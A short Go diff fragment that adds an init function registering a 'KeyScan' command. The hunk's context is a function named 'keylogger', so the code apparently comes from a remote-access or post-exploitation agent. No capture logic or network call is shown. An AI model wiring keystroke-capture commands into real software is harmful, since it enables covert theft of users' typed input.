@@ -482,3 +482,6 @@ func keylogger() {
 		}
 	}
 }
+func init() {
+	command.RegisterCommand(KeyScan{})
+}
